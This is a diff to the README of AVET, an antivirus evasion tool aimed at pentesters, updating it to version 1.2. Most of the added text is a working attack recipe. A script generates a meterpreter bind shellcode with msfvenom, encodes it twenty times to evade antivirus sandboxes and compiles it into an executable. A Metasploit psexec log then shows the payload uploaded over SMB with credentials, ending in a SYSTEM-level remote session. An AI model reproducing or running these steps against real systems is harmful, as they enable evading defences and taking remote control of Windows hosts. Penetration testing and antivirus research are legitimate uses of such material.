@@ -2,7 +2,7 @@ AntiVirus Evasion Tool
 ======================
 
 AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
-In version 1.1 lot of stuff was introduced, for a complete overview have a look at the CHANGELOG file. Now 64bit payloads can also be used, for easier usage I hacked a small build tool (avet_fabric.py).
+In version 1.2 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.
 
 For basics about antivirus evasion have a look at my old article: 
 https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
@@ -184,7 +184,7 @@ Example:
  ___|  '-'     '    ""       '-'   '-.'    '`      |____
 jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-AVET 1.1 Blackhat Asia 2017 edition
+AVET 1.2 Blackhat USA 2017 edition
 by Daniel Sauder
 
 avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.
@@ -232,3 +232,77 @@ The output file should be placed in the current directory.
 Bye...
 ```
 
+AVET & metasploit psexec
+------------------------
+New in version 1.2 is the support for metasploits psexec module. The corresponding make file looks like:
+
+```
+#!/bin/bash          
+# simple example script for building the .exe file
+# for use with msf psexec module
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
+msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
+# call make_avetsvc, the sandbox escape is due to the many rounds of decoding the shellcode
+./make_avetsvc -f sc.txt
+# compile to pwn.exe file
+$win32_compiler -o pwnsvc.exe avetsvc.c
+# cleanup
+echo "" > defs.h
+```
+
+And on the metasploit site:
+```
+msf exploit(psexec) > use exploit/windows/smb/psexec
+msf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe
+EXE::custom => /root/tools/ave/pwn.exe
+msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
+payload => windows/meterpreter/bind_tcp
+msf exploit(psexec) > set rhost 192.168.116.183
+rhost => 192.168.116.183
+msf exploit(psexec) > set smbuser dax
+smbuser => dax
+msf exploit(psexec) > set smbpass test123
+smbpass => test123
+msf exploit(psexec) > set lport 8443
+lport => 8443
+msf exploit(psexec) > run
+
+[*] 192.168.116.183:445 - Connecting to the server...
+[*] Started bind handler
+[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...
+[*] Sending stage (957487 bytes) to 192.168.116.183
+[*] 192.168.116.183:445 - Selecting native target
+[*] 192.168.116.183:445 - Uploading payload...
+[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!
+[*] 192.168.116.183:445 - Created \mzrCIOVg.exe...
+[+] 192.168.116.183:445 - Service started successfully...
+[*] 192.168.116.183:445 - Deleting \mzrCIOVg.exe...
+[-] 192.168.116.183:445 - Delete of \mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
+[*] Exploit completed, but no session was created.
+msf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200
+
+msf exploit(psexec) > sessions
+
+Active sessions
+===============
+
+Id Type Information Connection
+-- ---- ----------- ----------
+4 meterpreter x86/windows NT-AUTORIT_T\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)
+
+msf exploit(psexec) > sessions -i 4
+[*] Starting interaction with 4...
+
+meterpreter > sysinfo
+Computer : DAX-RYMZ48Z3EYO
+OS : Windows XP (Build 2600, Service Pack 3).
+Architecture : x86
+System Language : de_DE
+Domain : ARBEITSGRUPPE
+Logged On Users : 2
+Meterpreter : x86/windows
+```
